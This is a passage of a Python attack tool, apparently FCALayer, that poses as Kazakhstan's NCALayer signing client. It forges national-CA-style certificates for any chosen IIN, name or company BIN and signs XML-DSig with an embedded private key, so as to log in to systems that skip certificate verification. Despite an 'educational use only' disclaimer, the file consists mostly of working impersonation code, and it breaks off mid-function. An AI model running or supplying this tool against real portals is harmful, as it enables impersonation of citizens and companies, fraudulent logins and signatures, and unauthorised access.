#!/usr/bin/env python3

"""

Fake Certification Authority Layer

Утилита для аутентификации по ЭЦП в уязвимых системах, не проверяющих подлинность сертификата НУЦ РК.
Для использования необхродимо закрыть NCALayer.

Установка зависимостей Python 3.10+: pip install -r requirements.txt

The software is written for educational purposes only. Use only if you have permission of the owner
Программное обеспечение написано только для образовательных целей. Используйте только с разрешения владельца

Copyright (c) 2023 Konstantin Burov. All rights reserved.
This work is licensed under the terms of the MIT license.
For a copy, see <https://opensource.org/licenses/MIT>.

https://github.com/sadshade/FCALayer/

"""

import requests
import time
import random
import json
import ssl
import asyncio
import websockets
import re
import os
import base64
import sys
import getopt
import signal
import Crypto.Hash.SHA256 as sha256
import Crypto.PublicKey.RSA as rsa
from datetime import datetime, timedelta
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.serialization import pkcs7
from cryptography.hazmat.primitives.serialization import pkcs12
from pyasn1.codec.der import decoder as asn1decoder
from pyasn1.codec.der import encoder as asn1encoder
from cryptography import x509
from Crypto.Signature import pkcs1_15

#  Шаблон тела XML для подписи XML-DSig
XML_TMP: str = """<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
<ds:SignedInfo>
<ds:CanonicalizationMethod Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"/>
<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
<ds:Reference URI="">
<ds:Transforms>
<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
<ds:Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315#WithComments"/>
</ds:Transforms>
<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
<ds:DigestValue>%(DIGEST)s</ds:DigestValue>
</ds:Reference>
</ds:SignedInfo>
<ds:SignatureValue>
%(SIGNATURE)s
</ds:SignatureValue>
<ds:KeyInfo>
<ds:X509Data>
<ds:X509Certificate>
%(CERT)s
</ds:X509Certificate>
</ds:X509Data>
</ds:KeyInfo>
</ds:Signature>"""

#  Шаблон сертификата X.509 для физического лица
IND_CERT_AUTH: str = """
MIIGVTCCBD2gAwIBAgIUOo7keDU4mX/KewnAlVWyiq8KlO8wDQYJKoZIhvcNAQELBQAwUjELMAkGA1UEBhMCS1oxQzBBBgNV
BAMMOtKw0JvQotCi0KvSmiDQmtCj05jQm9CQ0J3QlNCr0KDQo9Co0Ksg0J7QoNCi0JDQm9Cr0pogKFJTQSkwHhcNMjMxMDI0MDM0NzA4WhcNMjQxMDIzMDM0
NzA4WjB0MR4wHAYDVQQDDBXQmNC80Y8g0KTQsNC80LjQu9C40Y8xCzAJBgNVBAQMAm5vMRgwFgYDVQQFEw9JSU4xMTExMTExMTExMTExCzAJBgNVBAYTAkta
MQswCQYDVQQqDAJubzERMA8GCSqGSIb3DQEJARYCbm8wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDVY0797mzvqbhObsIRepFcZXQCak3l8YGP
brXkTm3UodwOF5zARFniVYtGS1UA7FgrLaIEIzw3HrD6YidcGd1vsE4cUiPyGY6XWEZQ6pdHhw0J++Z6qVS0aGPRJR28FeVuDRK+bqJztrH1+isft/HYSdn4
FVENrlLauh+EPBfcJ0XUsojPJx5RbWV7d0tUlgfq76M1j/jdSTdm4ToBUwIw9nslk+L+qEKVjz7tDv6SlLr39eXQCaFvCM7QakUeuL9TB/wNZwSQ+psxUKxQ
KppTyBoLkQ8cD8hgRdCZ4ek0oGiudls0/KF6JoQnLAjUyKT75pMtkrWzi/HTmhmzbTTBAgMBAAGjggH/MIIB+zAoBgNVHSUEITAfBggrBgEFBQcDAgYIKoMO
AwMEAQEGCSqDDgMDBAMCATBeBgNVHSAEVzBVMFMGByqDDgMDAgQwSDAhBggrBgEFBQcCARYVaHR0cDovL3BraS5nb3Yua3ovY3BzMCMGCCsGAQUFBwICMBcM
FWh0dHA6Ly9wa2kuZ292Lmt6L2NwczBXBgNVHR8EUDBOMEygSqBIhiFodHRwOi8vY3JsLnBraS5nb3Yua3ovbmNhX3JzYS5jcmyGIyBodHRwOi8vY3JsMS5w
a2kuZ292Lmt6L25jYV9yc2EuY3JsMA4GA1UdDwEB/wQEAwIFoDBiBggrBgEFBQcBAQRWMFQwLgYIKwYBBQUHMAKGImh0dHA6Ly9wa2kuZ292Lmt6L2NlcnQv
bmNhX3JzYS5jZXIwIgYIKwYBBQUHMAGGFmh0dHA6Ly9vY3NwLnBraS5nb3Yua3owWgYDVR0uBFMwUTBPoE2gS4YjaHR0cDovL2NybC5wa2kuZ292Lmt6L25j
YV9kX3JzYS5jcmyGJGh0dHA6Ly9jcmwxLnBraS5nb3Yua3ovbmNhX2RfcnNhLmNybDAdBgNVHQ4EFgQUJsTElpjhMNFwQ5oFegl5aoEowIUwDwYDVR0jBAgw
BoAEW2p0ETAWBgYqgw4DAwUEDDAKBggqgw4DAwUBATANBgkqhkiG9w0BAQsFAAOCAgEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
"""

#  Шаблон сертификата X.509 для физического лица для подписи (RSA_*.p12)
IND_CERT_SIGN: str = """MIIGVDCCBDygAwIBAgIUOo7keDU4mX/KewnAlVWyiq8KlO8wDQYJKoZIhvcNAQELBQAwUjELMAkGA1UEBhMCS1oxQzBBBgNVBAMMO
tKw0JvQotCi0KvSmiDQmtCj05jQm9CQ0J3QlNCr0KDQo9Co0Ksg0J7QoNCi0JDQm9Cr0pogKFJTQSkwHhcNMjMxMDI0MDM0NzA4WhcNMjQxMDIzMDM0NzA4W
jB0MR4wHAYDVQQDDBXQmNC80Y8g0KTQsNC80LjQu9C40Y8xCzAJBgNVBAQMAm5vMRgwFgYDVQQFEw9JSU4xMTExMTExMTExMTExCzAJBgNVBAYTAktaMQswC
QYDVQQqDAJubzERMA8GCSqGSIb3DQEJARYCbm8wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDVY0797mzvqbhObsIRepFcZXQCak3l8YGPbrXkT
m3UodwOF5zARFniVYtGS1UA7FgrLaIEIzw3HrD6YidcGd1vsE4cUiPyGY6XWEZQ6pdHhw0J++Z6qVS0aGPRJR28FeVuDRK+bqJztrH1+isft/HYSdn4FVENr
lLauh+EPBfcJ0XUsojPJx5RbWV7d0tUlgfq76M1j/jdSTdm4ToBUwIw9nslk+L+qEKVjz7tDv6SlLr39eXQCaFvCM7QakUeuL9TB/wNZwSQ+psxUKxQKppTy
BoLkQ8cD8hgRdCZ4ek0oGiudls0/KF6JoQnLAjUyKT75pMtkrWzi/HTmhmzbTTBAgMBAAGjggH+MIIB+jAOBgNVHQ8BAf8EBAMCBsAwKAYDVR0lBCEwHwYIK
wYBBQUHAwQGCCqDDgMDBAEBBgkqgw4DAwQDAgEwXgYDVR0gBFcwVTBTBgcqgw4DAwIDMEgwIQYIKwYBBQUHAgEWFWh0dHA6Ly9wa2kuZ292Lmt6L2NwczAjB
ggrBgEFBQcCAjAXDBVodHRwOi8vcGtpLmdvdi5rei9jcHMwVgYDVR0fBE8wTTBLoEmgR4YhaHR0cDovL2NybC5wa2kuZ292Lmt6L25jYV9yc2EuY3JshiJod
HRwOi8vY3JsMS5wa2kuZ292Lmt6L25jYV9yc2EuY3JsMFoGA1UdLgRTMFEwT6BNoEuGI2h0dHA6Ly9jcmwucGtpLmdvdi5rei9uY2FfZF9yc2EuY3JshiRod
HRwOi8vY3JsMS5wa2kuZ292Lmt6L25jYV9kX3JzYS5jcmwwYgYIKwYBBQUHAQEEVjBUMC4GCCsGAQUFBzAChiJodHRwOi8vcGtpLmdvdi5rei9jZXJ0L25jY
V9yc2EuY2VyMCIGCCsGAQUFBzABhhZodHRwOi8vb2NzcC5wa2kuZ292Lmt6MB0GA1UdDgQWBBQmxMSWmOEw0XBDmgV6CXlqgSjAhTAPBgNVHSMECDAGgARba
nQRMBYGBiqDDgMDBQQMMAoGCCqDDgMDBQEBMA0GCSqGSIb3DQEBCwUAA4ICAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAA=="""

#  Шаблон сертификата X.509 для юридического лица
ENT_CERT_AUTH: str = """
MIIHRzCCBS+gAwIBAgIUOo7keDU4mX/KewnAlVWyiq8KlO8wDQYJKoZIhvcNAQELBQAwgc4xCzAJBgNVBAYTAktaMRUwEwYD
VQQHDAzQkNCh0KLQkNCd0JAxFTATBgNVBAgMDNCQ0KHQotCQ0J3QkDFMMEoGA1UECgxD0KDQnNCaIMKr0JzQldCc0JvQldCa0JXQotCi0IbQmiDQotCV0KXQ
ndCY0JrQkNCb0KvSmiDSmtCr0JfQnNCV0KLCuzFDMEEGA1UEAww60rDQm9Ci0KLQq9KaINCa0KPTmNCb0JDQndCU0KvQoNCj0KjQqyDQntCg0KLQkNCb0KvS
miAoUlNBKTAeFw0yMzA4MzEwODE3NDdaFw0yNDA4MzAwODE3NDdaMIIBEDEeMBwGA1UEAwwV0JjQnNCvINCk0JDQnNCY0JvQmNCvMRcwFQYDVQQEDA7QpNCQ
0JzQmNCb0JjQrzEYMBYGA1UEBRMPSUlOMTExMTExMTExMTExMQswCQYDVQQGEwJLWjEVMBMGA1UEBwwM0JDQodCi0JDQndCQMRUwEwYDVQQIDAzQkNCh0KLQ
kNCd0JAxKjAoBgNVBAoMIdCd0JDQl9CS0JDQndCY0JUg0JrQntCc0J/QkNCd0JjQmDEYMBYGA1UECwwPQklOMjIyMjIyMjIyMjIyMRkwFwYDVQQqDBDQntCi
0KfQldCh0KLQktCeMR8wHQYJKoZIhvcNAQkBFhB1c2VyQGV4YW1wbGUuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1WNO/e5s76m4Tm7C
EXqRXGV0AmpN5fGBj2615E5t1KHcDhecwERZ4lWLRktVAOxYKy2iBCM8Nx6w+mInXBndb7BOHFIj8hmOl1hGUOqXR4cNCfvmeqlUtGhj0SUdvBXlbg0Svm6i
c7ax9forH7fx2EnZ+BVRDa5S2rofhDwX3CdF1LKIzyceUW1le3dLVJYH6u+jNY/43Uk3ZuE6AVMCMPZ7JZPi/qhClY8+7Q7+kpS69/Xl0AmhbwjO0GpFHri/
Uwf8DWcEkPqbMVCsUCqaU8gaC5EPHA/IYEXQmeHpNKBornZbNPyheiaEJywI1Mik++aTLZK1s4vx05oZs200wQIDAQABo4IB1jCCAdIwDgYDVR0PAQH/BAQD
AgWgMCgGA1UdJQQhMB8GCCsGAQUFBwMCBggqgw4DAwQBAgYJKoMOAwMEAQIBMA8GA1UdIwQIMAaABFtqdBEwHQYDVR0OBBYEFCbExJaY4TDRcEOaBXoJeWqB
KMCFMF4GA1UdIARXMFUwUwYHKoMOAwMCAjBIMCEGCCsGAQUFBwIBFhVodHRwOi8vcGtpLmdvdi5rei9jcHMwIwYIKwYBBQUHAgIwFwwVaHR0cDovL3BraS5n
b3Yua3ovY3BzME4GA1UdHwRHMEUwQ6BBoD+GHWh0dHA6Ly9jcmwucGtpLmdvdi5rei9yc2EuY3Jshh5odHRwOi8vY3JsMS5wa2kuZ292Lmt6L3JzYS5jcmww
UgYDVR0uBEswSTBHoEWgQ4YfaHR0cDovL2NybC5wa2kuZ292Lmt6L2RfcnNhLmNybIYgaHR0cDovL2NybDEucGtpLmdvdi5rei9kX3JzYS5jcmwwYgYIKwYB
BQUHAQEEVjBUMC4GCCsGAQUFBzAChiJodHRwOi8vcGtpLmdvdi5rei9jZXJ0L3BraV9yc2EuY2VyMCIGCCsGAQUFBzABhhZodHRwOi8vb2NzcC5wa2kuZ292
Lmt6MA0GCSqGSIb3DQEBCwUAA4ICAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
"""

PRIVATE_KEY: str = """
MIIEowIBAAKCAQEA1WNO/e5s76m4Tm7CEXqRXGV0AmpN5fGBj2615E5t1KHcDhecwERZ4lWLRktVAOxYKy2iBCM8Nx6w+mInXBndb7BOHFIj8hmOl1hGUOqX
R4cNCfvmeqlUtGhj0SUdvBXlbg0Svm6ic7ax9forH7fx2EnZ+BVRDa5S2rofhDwX3CdF1LKIzyceUW1le3dLVJYH6u+jNY/43Uk3ZuE6AVMCMPZ7JZPi/qhC
lY8+7Q7+kpS69/Xl0AmhbwjO0GpFHri/Uwf8DWcEkPqbMVCsUCqaU8gaC5EPHA/IYEXQmeHpNKBornZbNPyheiaEJywI1Mik++aTLZK1s4vx05oZs200wQID
AQABAoIBABX2mkdNtp22aNd90/DLnlGVyaqD+Y+c23qBaSxeHDTiEg3LRWGOx3eh2Wt7Tn0BVpPfJwlo/QYpXQrwdl+m8+FOksOcesGs+r2+IsKqWrbMgj2Q
VWkzq5nEEt4QhW56DHrW0qKSLZteZxPL04t4ueZKt6ouu4B+fF2yAZNxQf1xR0QYbtwQOCMPnpvh/ipW9DSjBT4wYbd11GqGhFhSsz7C63x0VIoTs+Yv+z/b
6chfHsc6eyt4Vc8RAv9KgpydKVWQiPCD/DdtM2aZrkjdwU4Hke2zT+gala2X6DkHkdHLzl/Lry7f0DX6IuWgMbZk79n3KcL1cjl+87D3PSBDGp8CgYEA6jDc
AsGl45+MJSyBQaPb/JesA9wYfCx9ovK3UV1vAOETZR6buZCEv8uo25GngjpGJ/cvOF8I8NC1SUC68S4IlbOZkDdPWp2MFmjP4thBQ3Tb1UOqCiN8dZ6zGzLM
t4JWS/3q6mkcGvcVh6fiDCDieXi4AD90Ua4dabnkENgPhkMCgYEA6UKBJ3DDY79XxDU1ErDuUgGHEPyJ1w74LWI7+nu8jV9daZTlHE149YAbuyAUjpHYPJMp
wMeIA26IkzsvqeUfIkokExq65vrV2PKWf9w3DpT18qTm+jcLJMCj2b5NdmmIQDBrS/Zmyyx3qws/6s4stkQMrMUzDFZMk8Esa4LWAqsCgYEAuGnHJiiFUAw4
GKHGGwFEXtC0tMlhQo7qVCFa96him8ehNTR4HhTOZBWkn1pAFM18p0X/mh1D9hXzW36sdvTv76pg126mf02mnZLleNUf91WTMom44Yj2HczdbyJ+kFcDS43k
qbghWJ6PBqbN2w0eKddE1XUiTJuWL8Yg8J6jAu8CgYBBnhe/BJWyha0m4ODhNSyVnSBlwuTzvp5KBgxhVlWgX2djwCMDZzfTuAoVBd1CjfyKbcudE4RLktiQ
smGiJXYwqzKivS4+s+lcckGsDkLes0DM1V60nK9h019EbahU2zMc+4HziIk6NnQjhbKhVwZ074exQngtzEkWd40LYW7aqQKBgCdOwCdbePYqL+tO+T6nHsbi
nBxhJnx9X5XWftZY96AKjqPjxLhjvblesX7rf5Dim0BmWguP2byuOooqwDPoolQFT+osa4D9cT4jQJ0Md2aLCGhWrma1R/4FdRocvLiJiR6hPMNuM1h6qzNl
OO2Vt6qaHkOG+zAJrlT42gLolx7T
"""

#  Канонизированный шаблон SignedInfo для подписи XML-DSig
SIGNED_INFO: str = '''<ds:SignedInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
<ds:CanonicalizationMethod Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315"></ds:CanonicalizationMethod>
<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"></ds:SignatureMethod>
<ds:Reference URI="">
<ds:Transforms>
<ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"></ds:Transform>
<ds:Transform Algorithm="http://www.w3.org/TR/2001/REC-xml-c14n-20010315#WithComments"></ds:Transform>
</ds:Transforms>
<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"></ds:DigestMethod>
<ds:DigestValue>%(DIGEST)s</ds:DigestValue>
</ds:Reference>
</ds:SignedInfo>'''


def insert_newlines(string, every=64):
    # Разбивка BASE64 строки

    return '\n'.join(string[i:i + every] for i in range(0, len(string), every))


def print_help_and_exit():
    print(os.path.basename(__file__) +
          ':\n\t★ --type ind|ent|file (Физическое/Юридическое лицо/PKCS#12 file)'
          '\n\t  --iin ИИН [111111111110]'
          '\n\t  --commonname [ИВАНОВ ИВАН]'
          '\n\t  --surname [ИВАНОВ]'
          '\n\t  --country [KZ]'
          '\n\t  --locality [АСТАНА]'
          '\n\t  --state [АСТАНА]'
          '\n\t  --org [ТОО Рога и копыта]'
          '\n\t  --bin БИН [222222222220]'
          '\n\t  --givenname [ИВАНОВИЧ]'
          '\n\t  --email [test@example.com]'
          '\n\t  --dontsend (Don\'t send signature) '
          '\n\t  --keytype [auth] | sign '
          '\n\t  --delay [0] Delay for signature send in seconds'
          '\n\t  --file (path to file)'
          '\n\t  --password (PKCS#12 container password)'
          '\n\t  --break-signature (Send broken signature)')
    sys.exit(1)


def get_cert_params(argv):
    # Сбор параметров запуска

    cert_info = dict(type='', iin='111111111110', commonname='ИВАНОВ ИВАН', surname='ИВАНОВ', country='KZ',
                     locality='АСТАНА', state='АСТАНА', org='ТОО Рога и копыта', bin='222222222220',
                     serialNumber='334308073031793478474460668302841842975940187375',
                     keyId='26C4C49698E130D170439A057A09796A8128C085', delay=0, file=None, password=None,
                     givenname='ИВАНОВИЧ', email='test@example.com', dontsend=False, keytype='auth',
                     certificate='', privatekey='', breaksignature=False)

    opts, args = getopt.getopt(argv, "h",
                               ["type=", "iin=", "bin=", "commonname=", "surname=", "country=", "givenname=", "email=",
                                "locality=", "state=", "org=", "bin=", "dontsend", "keytype=", "delay=", "file=",
                                "password=", "break-signature"])
    if not opts:
        opts = [('-h', '')]

    # Check args
    for opt, arg in opts:
        match opt:
            case '-h':
                print_help_and_exit()
            case "--type":
                # Юридическое/Физическое лицо
                if arg in {"ind", "ent", "file"}:
                    cert_info['type'] = arg
                else:
                    print_help_and_exit()
            case "--commonname":
                # CN (Фамилия Имя)
                cert_info['commonname'] = arg
            case "--surname":
                # SN (Фамилия)
                cert_info['surname'] = arg
            case "--iin":
                # serialNumber (ИИН)
                if len(arg) != 12:
                    print("*** Warn: Make sure IIN is the correct length.")
                cert_info['iin'] = arg
            case "--country":
                # C (Country)
                cert_info['country'] = arg
            case "--locality":
                # L (Город)
                cert_info['locality'] = arg
            case "--state":
                # S (Область)
                cert_info['state'] = arg
            case "--org":
                # O (Компания)
                cert_info['org'] = arg
            case "--bin":
                # OU (БИН)
                if len(arg) != 12:
                    print("*** Warn: Make sure BIN is the correct length.")
                cert_info['bin'] = arg
            case "--givenname":
                # G (Отчество)
                cert_info['givenname'] = arg
            case "--email":
                # E (email)
                cert_info['email'] = arg
            case "--dontsend":
                # Don't send signature
                cert_info['dontsend'] = True
            case "--keytype":
                # Тип ключа:
                #   auth - для аутентификации
                #   sign - для подписи (только для физ.лица)
                if arg in ("auth", "sign"):
                    cert_info['keytype'] = arg
                else:
                    print("*** Err: Unsupported key type!")
                    sys.exit(1)
            case "--delay":
                #  Delay signature send
                try:
                    cert_info['delay'] = int(arg)
                except:
                    print("*** Err: pass Int for delay")
                    sys.exit(1)
            case "--file":
                cert_info['file'] = arg
            case "--password":
                cert_info['password'] = arg
            case "--break-signature":
                cert_info['breaksignature'] = True

    if cert_info['type'] == '':
        print_help_and_exit()

    return cert_info


def get_altered_cert(cert_info):
    # Модификация шаблона сертификата

    cert = None
    match cert_info['type']:
        case "ind":
            match cert_info['keytype']:
                case "auth":
                    cert, rest = asn1decoder.decode(base64.b64decode(IND_CERT_AUTH.encode()))
                case "sign":
                    cert, rest = asn1decoder.decode(base64.b64decode(IND_CERT_SIGN.encode()))
        case "ent":
            if cert_info['keytype'] == "sign":
                print("*** Err: Sign key type only supported for individuals")
                sys.exit(1)
            else:
                cert, rest = asn1decoder.decode(base64.b64decode(ENT_CERT_AUTH.encode()))

    '''
    E               = дрес электронный почты
    Serialnumber    = IIN012345678910
    CN              = Фамилия Имя
    SN              = Фамилия
    OU              = BIN012345678910
    O               = Наименование организации
    L               = Город регистрации юридического лица
    S               = Область регистрации юридического лица
    C               = KZ
    G               = Отчество
    '''

    # Изменения шаблона сертификата по заданным параметрам
    # CN (Фамилия Имя)
    cert['field-0']['field-5'][0][0]['field-1'] = cert_info['commonname']

    # SN (Фамилия)
    cert['field-0']['field-5'][1][0]['field-1'] = cert_info['surname']

    # Serialnumber (ИИН)
    cert['field-0']['field-5'][2][0]['field-1'] = 'IIN' + cert_info['iin']

    # C (Country)
    cert['field-0']['field-5'][3][0]['field-1'] = cert_info['country']
    if cert_info['type'] == "ent":
        # L (Город)
        cert['field-0']['field-5'][4][0]['field-1'] = cert_info['locality']

        # S (Область)
        cert['field-0']['field-5'][5][0]['field-1'] = cert_info['state']

        # O (Компания)
        cert['field-0']['field-5'][6][0]['field-1'] = cert_info['org']

        # OU (БИН)
        cert['field-0']['field-5'][7][0]['field-1'] = 'BIN' + cert_info['bin']

        # G (Отчество)
        cert['field-0']['field-5'][8][0]['field-1'] = cert_info['givenname']

        # E (email)
        cert['field-0']['field-5'][9][0]['field-1'] = cert_info['email']

    else:
        # G (Отчество)
        cert['field-0']['field-5'][4][0]['field-1'] = cert_info['givenname']

        # E (email)
        cert['field-0']['field-5'][5][0]['field-1'] = cert_info['email']

    # Срок действия сертификата 180 дней от текущей даты
    cert['field-0']['field-4'][0] = (datetime.now() - timedelta(days=180)).strftime("%y%m%d%H%M%S") + 'Z'
    cert['field-0']['field-4'][1] = (datetime.now() + timedelta(days=180)).strftime("%y%m%d%H%M%S") + 'Z'

    # Рандомная подпись сертификата, привет QazCloud
    # VXNlIHlvdXIgZ2NocSBtYWdpYw0KDQoyNTMxNDYyNTQzMzIyNTM4NDIyNTMwMzgyNTMwMzAyNTMwMzQyNTM2MzAyNTMzNDU2NjI1MzAzMDI1NDMzMzI1NDI0NjI1MzI0NDI1NDMzMzI1MzgzOTQxMjUzMDQxNDIyNTMyMzEyNTMxMzAyNTMwMzAyNTQzMzMyNTM5MzAyNTQzMzIyNTQxNDIyNTMwNDM2ZTQ2MjU0MzMyMjU0MTM5MjU0MzMzMjUzODM0MjU0MzMyMjUzODM0MzY0MTI1MzIzNzMxMjUzMDM5MjU0MzMzMjUzODM2MjU0MzMzMjUzODM2MjUzMTM4MjU0MzMzMjU0MjQxMjUzMjM5MjU0MzMzMjU0MTM4MjUzMjQzMjU0MzMzMjU0MjQxMjU0MzMyMjU0MjM3NzcyNTQzMzMyNTQyMzMyNTQzMzMyNTM5MzcyNTQzMzIyNTQxNDYyNTQzMzMyNTQyMzAyNTQzMzMyNTM5MzAyNTQzMzIyNTM4MzQ1NTc4MjUzNzQyMjUzNTQ2MjUzMjMyNjY3ODI1MzAzMDQ5MjU0MzMyMjU0MjMzMjU0MzMzMjUzOTMyMjU0MzMzMjUzOTM0MjU0MzMzMjUzOTM3MjU0MzMzMjUzOTMxMjUzNzQ2MjUzMjQ2MjU0MzMzMjUzOTQxMjU0MzMyMjUzOTM1MjU0MzMyMjU0MTM3MjUzMjM1MjUzNzQzMjU0MzMzMjU0MjQ1NDMyNTM0MzAzODI1NDMzMzI1MzgzMTI1NDMzMzI1NDEzNDMyNTgyNTQzMzIyNTQxMzcyNTQzMzMyNTM5MzcyNTQzMzMyNTQyNDUyNTQzMzMyNTQxMzU3NjI1NDMzMzI1NDEzODI1NDMzMzI1NDE0NDI1MzE0MTI1NDMzMzI1Mzk0NDI1MzEzOTI1MzA0MzI1NDMzMzI1MzgzOTI1NDMzMzI1MzgzNzM4MjU0MzMyMjUzOTM3MjU0MzMzMjU0MTMyMjUzMzQ0MjUzMjQ2MjUzMDM1MjU0MzMyMjU0MjQ0MzIyNTMwMzY1NDI1MzAzMDI1MzAzMDI1MzAzMA==

    # Serialize back to ASN.1 and return in base64 encoded certificate
    cert_info['certificate'] = insert_newlines(base64.b64encode(asn1encoder.encode(cert)).decode('ascii'))
    cert_info['privatekey'] = PRIVATE_KEY


def load_from_file(cert_info):
    # Загрузка PKCS#12 из файла

    if cert_info['file'] == None or cert_info['password'] == None:
        print("*** Err: No file name or password provided")
        sys.exit(1)

    try:
        # Read PKCS#12 data from file
        file = open(cert_info['file'], "rb")
        pkcs12_data = file.read()
        file.close()

        # Load container
        (key, certificate, additional_certificates) = \
            pkcs12.load_key_and_certificates(pkcs12_data, cert_info['password'].encode())

        cert_info['certificate'] = insert_newlines(base64.b64encode(
            certificate.public_bytes(serialization.Encoding.DER)
        ).decode())

        cert_info['privatekey'] = base64.b64encode(key.private_bytes(
            serialization.Encoding.DER,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption()
        ))

        load_params_from_cert(cert_info)

    except OSError as err:
        print("*** Err: " + err.strerror)
        sys.exit(1)
    except ValueError as err:
        print("*** Err: " + err.__str__())
        sys.exit(1)


def load_params_from_cert(cert_info):
    # Загрузка параметров из сертификата
    cert = x509.load_der_x509_certificate(base64.b64decode(cert_info['certificate'].encode()))

    cert_info['serialNumber'] = cert.serial_number

    # CN (Фамилия Имя)
    cert_info['commonname'] = cert.subject.get_attributes_for_oid(oid=x509.oid.NameOID.COMMON_NAME)[0].value

    # SN (Фамилия)
    cert_info['surname'] = cert.subject.get_attributes_for_oid(oid=x509.oid.NameOID.SURNAME)[0].value

    # Serialnumber (ИИН)
    cert_info['iin'] = cert.subject.get_attributes_for_oid(oid=x509.oid.NameOID.SERIAL_NUMBER)[0].value

    # C (Country)
    cert_info['country'] = cert.subject.get_attributes_for_oid(oid=x509.oid.NameOID.COUNTRY_NAME)[0].value

    # G (Отчество)
    cert_info['givenname'] = cert.subject.get_attributes_for_oid(oid=x509.oid.NameOID.GIVEN_NAME)[0].value

    # E (email)
    cert_info['email'] = cert.subject.get_attributes_for_oid(oid=x509.oid.NameOID.EMAIL_ADDRESS)[0].value

    # Проверяем есть ли атрибут из сертификата для юр.лиц
    ent_cert = len(cert.subject.get_attributes_for_oid(
        oid=x509.oid.NameOID.LOCALITY_NAME)
    ) > 0

    if ent_cert:  # Сертификат для юр.лица
        # L (Город)
